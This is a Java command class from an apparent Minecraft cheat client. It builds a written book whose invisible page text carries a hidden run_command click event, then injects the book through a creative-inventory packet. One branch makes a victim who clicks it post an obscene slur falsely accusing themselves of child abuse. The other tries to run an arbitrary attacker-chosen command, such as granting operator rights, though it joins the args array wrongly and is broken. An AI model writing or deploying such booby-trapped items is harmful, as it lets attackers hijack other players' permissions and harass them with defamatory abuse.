package me.bratwurst.module.Commands;


import me.bratwurst.manager.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class Beleidigen extends Command {
    public Beleidigen() {
        super("Bl", "Beleidigen", "Gib dir OP im Offen");
    }

    @Override
    public void onCommand(String command, String[] args) {
        if (args.length == 1) {
            ItemStack itm = new ItemStack(Items.written_book);
            NBTTagCompound base = new NBTTagCompound();
            NBTTagCompound display = new NBTTagCompound();
            NBTTagList lore = new NBTTagList();
            lore.appendTag((NBTBase) new NBTTagString("Buch"));
            display.setTag("Lore", (NBTBase) lore);
            base.setString("author", "Server");
            base.setByte("resolved", (byte) 1);
            base.setString("title", "EventBuch");
            NBTTagList pages = new NBTTagList();
            for (int i = 0; i < 4; i++) {
                pages.appendTag((NBTBase) new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"Ich Bin ein fetter Hurensohn und fickke Kindergarten Kinder!!! ihr cocks " + "\"},\"text\":\"                             \"}],\"text\":\"                             \"}"));

            }
            base.setTag("pages", (NBTBase) pages);
            itm.setTagCompound(base);
            (Minecraft.getMinecraft()).thePlayer.sendQueue.addToSendQueue((Packet) new C10PacketCreativeInventoryAction(36, itm));

        } else if (args.length >= 2) {
            String cmd = "";
            for (int i = 1; i < args.length; i++)
                cmd = String.valueOf(cmd) + args + " ";
            ItemStack itm = new ItemStack(Items.written_book);
            NBTTagCompound base = new NBTTagCompound();
            NBTTagCompound display = new NBTTagCompound();
            NBTTagList lore = new NBTTagList();
            lore.appendTag((NBTBase) new NBTTagString("Buch"));
            display.setTag("Lore", (NBTBase) lore);
            base.setString("author", "Admin");
            base.setByte("resolved", (byte) 1);
            base.setString("title", "Mein Buch");
            NBTTagList pages = new NBTTagList();
            for (int j = 0; j < 4; j++)
                pages.appendTag((NBTBase) new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/" + cmd + "\"},\"text\":\"                             \"}],\"text\":\"                             \"}"));
            base.setTag("pages", (NBTBase) pages);
            itm.setTagCompound(base);
            (Minecraft.getMinecraft()).thePlayer.sendQueue.addToSendQueue((Packet) new C10PacketCreativeInventoryAction(36, itm));
        }
    }

}
